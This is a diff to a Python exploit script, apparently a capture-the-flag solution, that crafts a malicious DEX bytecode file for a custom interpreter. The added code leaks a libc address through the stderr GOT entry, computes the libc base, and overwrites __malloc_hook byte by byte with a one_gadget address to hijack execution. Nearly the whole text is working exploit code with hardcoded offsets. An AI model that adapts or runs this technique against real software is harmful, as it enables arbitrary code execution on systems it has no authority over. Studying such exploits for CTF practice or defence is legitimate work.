@@ -105,8 +105,8 @@ print(dex.methods[1].code_offset)
 
 
 img_base = 0x08048000
-stderr_got = 0x08068FE0
-stderr_glibc = 0x001B3DF8
+stderr_got = 0x0806AFE0
+stderr_glibc = 0x001B3D00 #xxxxxxF8
 one_gadget = 0x3aa19
 malloc_hook = 0x1b3768
 
@@ -132,13 +132,13 @@ pc += 4
 # We need to patch 4 bytes of __malloc_hook to one_gadget, and more for Array to index, so we can do online
 # patching
 for i in range(12):
-    rawdata = patch(rawdata, pc, newint(3, 0x2cd + i*4))
+    rawdata = patch(rawdata, pc, newint(3, 0xb4d + i*4))
     pc += 6
     rawdata = patch(rawdata, pc, iput(3, 1, 4+i))     # string 1-12: "22" - "33" : offset to index string
     pc += 4                                           # "38" - "49" placing fake string data
 
 for i in range(4):                      # setup the new string offset, new id 12 - 15
-    rawdata = patch(rawdata, pc, newint(3, 0x1018 + (38+i)*4))
+    rawdata = patch(rawdata, pc, newint(3, 0x1018 + (38+i*3)*4))
     pc += 6
     rawdata = patch(rawdata, pc, iput(3, 1, 0x10+i))
     pc += 4
@@ -184,89 +184,213 @@ rawdata = patch(rawdata, pc, newint(4, 0xb8))   # append last byte - string base
 pc += 6
 rawdata = patch(rawdata, pc, add(3, 4, 3))      # v3: string base addr4ess (heap)
 pc += 4
-rawdata = patch(rawdata, pc, newint(4, stderr_got)) # calculate offset to stderr got
-pc += 6
-rawdata = patch(rawdata, pc, sub(5, 4, 3))
-pc += 4
 
 # Sub routine, ends with jump table since invoke/call is not implemented && we have max insts limit
 # inputs : v5: addr
 # outputs : v13, v14, v15
 # vars : v6, v7
-rawdata = patch(rawdata, pc, newint(13, 10)) # clear out result regs
-pc += 6
-rawdata = patch(rawdata, pc, newint(14, 0))
-pc += 6
-rawdata = patch(rawdata, pc, newint(15, 0))
-pc += 6
-rawdata = patch(rawdata, pc, newint(21, ord('0')))
-pc += 6
-rawdata = patch(rawdata, pc, newint(6, 10)) # length field of string [10]
-pc += 6
-rawdata = patch(rawdata, pc, rem(7, 5, 6))  # byte 1
-pc += 4
-rawdata = patch(rawdata, pc, add(7, 7, 21))
-pc += 4
-rawdata = patch(rawdata, pc, mul(15, 7, 18))
-pc += 4
-rawdata = patch(rawdata, pc, div(5, 5, 6))
-pc += 4
-rawdata = patch(rawdata, pc, rem(7, 5, 6))  # byte 2
-pc += 4
-rawdata = patch(rawdata, pc, add(7, 7, 21))
-pc += 4
-rawdata = patch(rawdata, pc, mul(7, 7, 17))
-pc += 4
-rawdata = patch(rawdata, pc, add(15, 7, 15))
-pc += 4
-rawdata = patch(rawdata, pc, div(5, 5, 6))
-pc += 4
-rawdata = patch(rawdata, pc, rem(7, 5, 6))  # byte 3
-pc += 4
-rawdata = patch(rawdata, pc, add(7, 7, 21))
-pc += 4
-rawdata = patch(rawdata, pc, add(15, 7, 15))
-pc += 4
-rawdata = patch(rawdata, pc, div(5, 5, 6))
-pc += 4
-for i in range(3):                          # bytes 4-6
-    rawdata = patch(rawdata, pc, rem(7, 5, 6))
+def addr2str(rawdata, pc):
+    rawdata = patch(rawdata, pc, newint(13, 10)) # clear out result regs
+    pc += 6
+    rawdata = patch(rawdata, pc, newint(14, 0))
+    pc += 6
+    rawdata = patch(rawdata, pc, newint(15, 0))
+    pc += 6
+    rawdata = patch(rawdata, pc, newint(21, ord('0')))
+    pc += 6
+    rawdata = patch(rawdata, pc, newint(6, 10)) # length field of string [10]
+    pc += 6
+    rawdata = patch(rawdata, pc, rem(7, 5, 6))  # byte 1
     pc += 4
     rawdata = patch(rawdata, pc, add(7, 7, 21))
     pc += 4
-    rawdata = patch(rawdata, pc, mul(7, 7, 19-i))
+    rawdata = patch(rawdata, pc, mul(15, 7, 18))
+    pc += 4
+    rawdata = patch(rawdata, pc, div(5, 5, 6))
+    pc += 4
+    rawdata = patch(rawdata, pc, rem(7, 5, 6))  # byte 2
+    pc += 4
+    rawdata = patch(rawdata, pc, add(7, 7, 21))
+    pc += 4
+    rawdata = patch(rawdata, pc, mul(7, 7, 17))
+    pc += 4
+    rawdata = patch(rawdata, pc, add(15, 7, 15))
+    pc += 4
+    rawdata = patch(rawdata, pc, div(5, 5, 6))
+    pc += 4
+    rawdata = patch(rawdata, pc, rem(7, 5, 6))  # byte 3
+    pc += 4
+    rawdata = patch(rawdata, pc, add(7, 7, 21))
+    pc += 4
+    rawdata = patch(rawdata, pc, add(15, 7, 15))
+    pc += 4
+    rawdata = patch(rawdata, pc, div(5, 5, 6))
+    pc += 4
+    for i in range(3):                          # bytes 4-6
+        rawdata = patch(rawdata, pc, rem(7, 5, 6))
+        pc += 4
+        rawdata = patch(rawdata, pc, add(7, 7, 21))
+        pc += 4
+        rawdata = patch(rawdata, pc, mul(7, 7, 19-i))
+        pc += 4
+        rawdata = patch(rawdata, pc, add(14, 7, 14))
+        pc += 4
+        rawdata = patch(rawdata, pc, div(5, 5, 6))
+        pc += 4
+    rawdata = patch(rawdata, pc, rem(7, 5, 6))      # byte 7
+    pc += 4
+    rawdata = patch(rawdata, pc, add(7, 7, 21))
     pc += 4
     rawdata = patch(rawdata, pc, add(14, 7, 14))
     pc += 4
     rawdata = patch(rawdata, pc, div(5, 5, 6))
     pc += 4
-rawdata = patch(rawdata, pc, rem(7, 5, 6))      # byte 7
-pc += 4
-rawdata = patch(rawdata, pc, add(7, 7, 21))
-pc += 4
-rawdata = patch(rawdata, pc, add(14, 7, 14))
-pc += 4
-rawdata = patch(rawdata, pc, div(5, 5, 6))
-pc += 4
-for i in range(3):                          # bytes 8-10
-    rawdata = patch(rawdata, pc, rem(7, 5, 6))
-    pc += 4
-    rawdata = patch(rawdata, pc, add(7, 7, 21))
-    pc += 4
-    rawdata = patch(rawdata, pc, mul(7, 7, 19-i))
-    pc += 4
-    rawdata = patch(rawdata, pc, add(13, 7, 13))
-    pc += 4
-    rawdata = patch(rawdata, pc, div(5, 5, 6))
-    pc += 4
+    for i in range(3):                          # bytes 8-10
+        rawdata = patch(rawdata, pc, rem(7, 5, 6))
+        pc += 4
+        rawdata = patch(rawdata, pc, add(7, 7, 21))
+        pc += 4
+        rawdata = patch(rawdata, pc, mul(7, 7, 19-i))
+        pc += 4
+        rawdata = patch(rawdata, pc, add(13, 7, 13))
+        pc += 4
+        rawdata = patch(rawdata, pc, div(5, 5, 6))
+        pc += 4
+    return (rawdata, pc)
 
 
-# patch
+# calculate offset to stderr got
+rawdata = patch(rawdata, pc, newint(4, stderr_got+1-8))   # 2nd byte
+pc += 6
+rawdata = patch(rawdata, pc, sub(5, 4, 3))
+pc += 4
+rawdata, pc = addr2str(rawdata, pc)
+rawdata = patch(rawdata, pc, iput(13, 1, 0x14))   # "38"
+pc += 4
+rawdata = patch(rawdata, pc, iput(14, 1, 0x15))   # "39"
+pc += 4
+rawdata = patch(rawdata, pc, iput(15, 1, 0x16))   # "40"
+pc += 4
+rawdata = patch(rawdata, pc, newint(4, stderr_got+2-8))   # 3nd byte
+pc += 6
+rawdata = patch(rawdata, pc, sub(5, 4, 3))
+pc += 4
+rawdata, pc = addr2str(rawdata, pc)
+rawdata = patch(rawdata, pc, iput(13, 1, 0x17))   # "38"
+pc += 4
+rawdata = patch(rawdata, pc, iput(14, 1, 0x18))   # "39"
+pc += 4
+rawdata = patch(rawdata, pc, iput(15, 1, 0x19))   # "40"
+pc += 4
+rawdata = patch(rawdata, pc, newint(4, stderr_got+3-8))   # 4nd byte
+pc += 6
+rawdata = patch(rawdata, pc, sub(5, 4, 3))
+pc += 4
+rawdata, pc = addr2str(rawdata, pc)
+rawdata = patch(rawdata, pc, iput(13, 1, 0x1a))   # "38"
+pc += 4
+rawdata = patch(rawdata, pc, iput(14, 1, 0x1b))   # "39"
+pc += 4
+rawdata = patch(rawdata, pc, iput(15, 1, 0x1c))   # "40"
+pc += 4
 
 #*******************
 rawdata = patch(rawdata, pc, iput(0, 2, 0))     # patch StringIds pointer to Array area
 pc += 4
 
+# leak stderr libc addr
+rawdata = patch(rawdata, pc, iget(6, 2, 12))
+pc += 4
+rawdata = patch(rawdata, pc, ifgtz(6, 4))   # flip signess
+pc += 4
+rawdata = patch(rawdata, pc, sub(6, 6, 20))
+pc += 4
+rawdata = patch(rawdata, pc, iget(7, 2, 13))
+pc += 4
+rawdata = patch(rawdata, pc, ifgtz(7, 4))   # flip signess
+pc += 4
+rawdata = patch(rawdata, pc, sub(7, 7, 20))
+pc += 4
+rawdata = patch(rawdata, pc, iget(8, 2, 14))
+pc += 4
+rawdata = patch(rawdata, pc, ifgtz(8, 4))   # flip signess
+pc += 4
+rawdata = patch(rawdata, pc, sub(8, 8, 20))
+pc += 4
+
+rawdata = patch(rawdata, pc, newint(4, 0)) # compute __malloc_hook addr
+pc += 6
+rawdata = patch(rawdata, pc, mul(4, 8, 19))
+pc += 4
+rawdata = patch(rawdata, pc, mul(7, 7, 18))
+pc += 4
+rawdata = patch(rawdata, pc, add(4, 7, 4))
+pc += 4
+rawdata = patch(rawdata, pc, mul(6, 6, 17))
+pc += 4
+rawdata = patch(rawdata, pc, add(4, 6, 4))
+pc += 4
+rawdata = patch(rawdata, pc, newint(22, stderr_glibc))
+pc += 6
+rawdata = patch(rawdata, pc, sub(4, 4, 22))         # libc base
+pc += 4
+rawdata = patch(rawdata, pc, newint(23, one_gadget))
+pc += 6
+rawdata = patch(rawdata, pc, newint(24, malloc_hook))
+pc += 6
+rawdata = patch(rawdata, pc, newint(25, 1))         # v25 = 1
+pc += 6
+
+rawdata = patch(rawdata, pc, add(8, 4, 24))         # malloc_hook byte 1
+pc += 4
+rawdata = patch(rawdata, pc, sub(5, 8, 3))
+pc += 4
+rawdata, pc = addr2str(rawdata, pc)
+rawdata = patch(rawdata, pc, iput(13, 1, 0))   # "38"
+pc += 4
+rawdata = patch(rawdata, pc, iput(14, 1, 1))   # "39"
+pc += 4
+rawdata = patch(rawdata, pc, iput(15, 1, 2))   # "40"
+pc += 4
+
+rawdata = patch(rawdata, pc, add(8, 8, 25))         # malloc_hook byte 2
+pc += 4
+rawdata = patch(rawdata, pc, sub(5, 8, 3))
+pc += 4
+rawdata, pc = addr2str(rawdata, pc)
+rawdata = patch(rawdata, pc, iput(13, 1, 3))   # "41"
+pc += 4
+rawdata = patch(rawdata, pc, iput(14, 1, 4))   # "42"
+pc += 4
+rawdata = patch(rawdata, pc, iput(15, 1, 5))   # "43"
+pc += 4
+
+rawdata = patch(rawdata, pc, add(8, 8, 25))         # malloc_hook byte 3
+pc += 4
+rawdata = patch(rawdata, pc, sub(5, 8, 3))
+pc += 4
+rawdata, pc = addr2str(rawdata, pc)
+rawdata = patch(rawdata, pc, iput(13, 1, 6))   # "44"
+pc += 4
+rawdata = patch(rawdata, pc, iput(14, 1, 7))   # "45"
+pc += 4
+rawdata = patch(rawdata, pc, iput(15, 1, 8))   # "46"
+pc += 4
+
+rawdata = patch(rawdata, pc, add(8, 8, 25))         # malloc_hook byte 4
+pc += 4
+rawdata = patch(rawdata, pc, sub(5, 8, 3))
+pc += 4
+rawdata, pc = addr2str(rawdata, pc)
+rawdata = patch(rawdata, pc, iput(13, 1, 9))   # "47"
+pc += 4
+rawdata = patch(rawdata, pc, iput(14, 1, 10))   # "48"
+pc += 4
+rawdata = patch(rawdata, pc, iput(15, 1, 11))   # "49"
+pc += 4
+
+rawdata = patch(rawdata, pc, add(4, 4, 23))         # one gadget
+pc += 4
 
 
 # Patch Checksum
